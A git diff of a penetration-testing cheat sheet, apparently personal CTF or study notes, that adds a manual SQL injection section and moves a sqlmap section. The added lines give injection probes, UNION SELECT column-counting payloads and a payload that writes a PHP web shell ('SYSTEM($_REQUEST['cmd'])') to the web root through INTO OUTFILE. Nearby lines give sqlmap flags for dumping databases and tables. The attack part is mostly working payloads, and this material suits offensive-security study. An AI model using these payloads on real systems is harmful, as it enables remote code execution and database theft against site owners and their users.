@@ -310,11 +310,47 @@ git log
 git show [COMMIT-ID]
 ```
 
+## SQLi (MANUAL)
+### Finding An Injection Point
+```
+foo'
+foo' --
+foo' -- -
+foo' OR 1=1--
+foo' OR 'a' = 'a
+```
+> look for error messages or unexpected responses
+
+### Union Select
+> when finding an injection point figure out the expected number of columns, you know the correct number when the query gets executed successfully
+```
+foo' union select 1-- -
+foo' union select 1,2-- -
+foo' union select 1,2,3-- -
+...
+```
+> with the correct number of columns, try getting a reverseshell
+```
+foo' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+```
+
 ## MYSQL
 ```bash
 mysql -u [USER] -p'[PASSWORD]'
 mysql -u [USER] -p'[PASSWORD]' -h [HOST/IP]
 ```
+
+## SQLMAP
+```bash
+sqlmap -r [FULLFILEPATHTOREQUEST] -p [PARAM IN REQ BODY] --proxy="http://127.0.0.1:8080"
+sqlmap -u [URL]/?[PARAMNAME]=param1
+```
+> --dbs : dump database names\
+--proxy="http://127.0.0.1:8080"\
+-D [DB] : choose Target Database\
+-T [TABLE] : choose Target Table\
+-dump : dump target table\
+--dbms=[DBTYPE] : choose DBType (mysql)
 
 ## HASHCAT (Windows)
 ```shell
@@ -323,18 +359,6 @@ mysql -u [USER] -p'[PASSWORD]' -h [HOST/IP]
 >ATTACKTYPE : 0 for dictionary/dictionary-rule attack\
 HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes\
 PATHTORULE : \rules\best64.rule is good
-
-## SQLMAP
-```bash
-sqlmap -r [FULLFILEPATHTOREQUEST] -p [PARAM IN REQ BODY] --proxy="http://127.0.0.1:8080"
-sqlmap -u [URL]/?[PARAMNAME]=param1
-```
-> --dbs : dump database names\
---proxy="http://127.0.0.1:8080"\\
--D [DB] : choose Target Database\
--T [TABLE] : choose Target Table\
--dump : dump target table\
---dbms=[DBTYPE] : choose DBType (mysql)
 
 ## SMB
 ```bash
